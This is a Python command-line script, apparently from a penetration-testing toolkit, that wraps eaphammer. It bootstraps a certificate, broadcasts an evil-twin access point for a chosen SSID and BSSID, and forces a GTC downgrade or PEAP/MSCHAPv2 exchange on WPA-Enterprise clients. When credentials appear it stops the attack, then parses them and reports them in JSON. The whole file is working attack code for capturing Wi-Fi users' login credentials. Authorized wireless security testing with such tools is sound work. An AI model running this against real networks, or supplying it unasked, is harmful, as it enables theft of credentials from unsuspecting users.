#!/usr/bin/env python3
import argparse
import re
import subprocess
import shutil
import sys; sys.path.append(__file__.rsplit("/", 1)[0])

from _version import __version__
from ptlibs import ptjsonlib, ptprinthelper, ptmisclib
from ptlibs.ptprinthelper import ptprint


def run_eaphammer(args):
    # Check if eaphammer is available in the system PATH
    if shutil.which("eaphammer") is None:
        ptprint(
            "[!] 'eaphammer' executable not found. Please install eaphammer and ensure it's in your PATH.",
            bullet_type="ERROR",
            condition=not args_global.json
        )
        sys.exit(1)

    # Generate EAP certificate with pre-defined values
    certificate_cmd = [
        "eaphammer", "--bootstrap",
        "--cn", "BatSignalService",
        "--country", "US",
        "--state", "NewJersey",
        "--locale", "GothamCity",
        "--org", "WayneEnterprises",
        "--org", "AppliedScience",
        "--email", "batsignal@wayne.com"
    ]
    try:
        subprocess.run(
            certificate_cmd,
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except subprocess.CalledProcessError:
        ptprint(
            "[!] Certificate bootstrap failed, aborting.",
            bullet_type="ERROR",
            condition=not args_global.json
        )
        sys.exit(1)

    # Construct command line arguments based on authentication method
    cmd = [
        "eaphammer",
        "--interface", args.iface,
        "--auth", "wpa-eap",
        "--essid", args.ssid,
        "--bssid", args.bssid,
        "--channel", str(args.channel),
        "--creds",
    ]
    if args.auth_method == "gtc":
        cmd += ["--negotiate", "gtc-downgrade"]
    else:
        cmd += [
            "--negotiate", "manual",
            "--phase-1-methods", "PEAP,TTLS",
            "--phase-2-methods", "MSCHAPV2",
        ]

    # Define regex patterns for output filtering
    keep_patterns = [
        re.compile(r"^\[hostapd\] AP starting"),
        re.compile(r'^Using interface .*ssid ".+"'),
        re.compile(r"^wlan\d+: AP-DISABLE"),
    ]
    cred_start_patterns = [
        re.compile(r"^GTC:", re.IGNORECASE),
        re.compile(r"^MSCHAPV2:", re.IGNORECASE),
    ]
    cred_block_pattern = re.compile(r"^\s+")

    # Start eaphammer process with pipes for I/O
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
        text=True,
        bufsize=1,
    )

    # Variables for tracking credential capture
    credential_block = []
    credentials_found = False
    json_detection = f"{args.auth_method.upper()} credentials captured"

    # Monitor output until credential header is found
    try:
        for line in proc.stdout:
            if any(p.match(line) for p in keep_patterns):
                ptprint(line, bullet_type="TEXT", condition=not args_global.json, end="")
                continue

            if any(p.match(line) for p in cred_start_patterns):
                # Print the credential header line
                ptprint(line, bullet_type="TEXT", condition=not args_global.json, end="")

                # Alert user that credentials were found
                ptprint(f"[+] Detected {args.auth_method.upper()} credentials, ending the attack",
                        bullet_type="INFO", condition=not args_global.json)

                credentials_found = True
                proc.stdin.write("\n")
                proc.stdin.flush()
                break

    except KeyboardInterrupt:
        # Handle user interruption during capture phase
        proc.terminate()
        proc.wait()
        if args_global.json:
            ptjsonlib_object.set_status("error")
            ptjsonlib_object.set_message("Capture aborted by user")
            ptprint(ptjsonlib_object.get_result_json(), "", True)
        else:
            ptprint("\n[!] Interrupted by user, ending the attack...", file=sys.stderr)
        sys.exit(1)

    # Collect credential details and process teardown
    try:
        for line in proc.stdout:
            if not line.strip() or re.match(r"^\s*\d+%.*", line):
                continue

            # Collect indented credential lines
            if credentials_found and cred_block_pattern.match(line):
                credential_block.append(line)

            # Print relevant lines to console
            if any(p.match(line) for p in keep_patterns) or cred_block_pattern.match(line):
                ptprint(line, bullet_type="TEXT", condition=not args_global.json, end="")

    except KeyboardInterrupt:
        # Handle user interruption during teardown phase
        proc.terminate()
        proc.wait()
        if args_global.json:
            ptjsonlib_object.set_status("error")
            ptjsonlib_object.set_message("Capture aborted by user")
            ptprint(ptjsonlib_object.get_result_json(), "", True)
        else:
            ptprint("\n[!] Interrupted by user during teardown, forcing exit...", file=sys.stderr)
        sys.exit(1)

    proc.wait()

    # Process and output credentials in JSON format if requested
    if args_global.json and credentials_found:
        creds = {}
        for l in credential_block:
            # Parse key-value pairs from credential output
            m = re.match(r"\s*([^:]+):\s*(.+)", l)
            if m:
                key = m.group(1).strip()
                val = m.group(2).strip()
                creds[key] = val

        # Format credential information for JSON output
        if creds:
            pairs = ", ".join(f"{k}: {v}" for k, v in creds.items())
            full = f"{json_detection}, {pairs}"
        else:
            full = json_detection

        ptjsonlib_object.add_vulnerability(
            "PTV-EAP-CREDENTIALS",
            vuln_request=f"{args.auth_method.upper()} credentials were found",
            vuln_response=full
        )

    return proc.returncode


def get_help():
    # Generate help information structure for display
    return [
        {"description": ["Wrapper for eaphammer tool used for credential capture in EAP networks"]},
        {"usage": ["pteapeviltwin <options>"]},
        {"usage_example": [
            "pteapeviltwin -a gtc -i wlan0mon -b 00:11:22:33:44:55-s MyNetwork -c 6 ",
            "pteapeviltwin -a mschapv2 -i wlan0mon -b 00:11:22:33:44:55 -s MyNetwork -c 6 ",
        ]},
        {"options": [
        ["-a", "--auth-method", "<gtc|mschapv2>",    "Choose 'gtc' (GTC downgrade) or 'mschapv2' (PEAP→MSCHAPv2)"],
        ["-i", "--iface",       "<interface>",       "Wireless interface (e.g. wlan0mon)"],
        ["-b", "--bssid",       "<bssid>",           "Target BSSID"],
        ["-c", "--channel",     "<channel>",         "Channel number"],
        ["-s", "--ssid",        "<ssid>",            "SSID to broadcast"],
        ["-v",  "--version",          "",            "Show script version and exit"],
        ["-h",  "--help",             "",            "Show this help message and exit"],
        ["-j",  "--json",             "",            "Output in JSON format"],
        ]
        }]


def parse_args():
    # Parse and validate command line arguments
    global args_global
    parser = argparse.ArgumentParser(
        description="Wrapper for eaphammer that stops on credential capture and filters output"
    )
    parser.add_argument(
        "-a", "--auth-method",
        choices=["gtc", "mschapv2"],
        required=True,
        help="Choose 'gtc' (GTC downgrade) or 'mschapv2' (PEAP→MSCHAPv2)"
    )
    parser.add_argument(
        "-i", "--iface", required=True,
        help="Wireless interface (e.g. wlan1)"
    )
    parser.add_argument(
        "-b", "--bssid", required=True,
        help="Target BSSID"
    )
    parser.add_argument(
        "-c", "--channel", type=int, required=True,
        help="Channel number"
    )
    parser.add_argument(
        "-s", "--ssid", required=True,
        help="SSID to broadcast"
    )

    parser.add_argument("-j", "--json", action="store_true")
    parser.add_argument("-v", "--version", action='version', version=f'{SCRIPTNAME} {__version__}')

    # Show help if no arguments or help flag provided
    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        ptprinthelper.help_print(get_help(), SCRIPTNAME, __version__)
        sys.exit(0)
        
    args = parser.parse_args()
    args_global = args
    ptprinthelper.print_banner(SCRIPTNAME, __version__, args.json, space=0)
    return args


def main():
    # Initialize global variables and start execution
    global SCRIPTNAME, ptjsonlib_object
    SCRIPTNAME = "pteviltwin"
    ptjsonlib_object = ptjsonlib.PtJsonLib()

    args = parse_args()
    exit_code = run_eaphammer(args)

    ptjsonlib_object.set_status("finished")
    ptprint(ptjsonlib_object.get_result_json(), "", args_global.json)

if __name__ == "__main__":
    main()
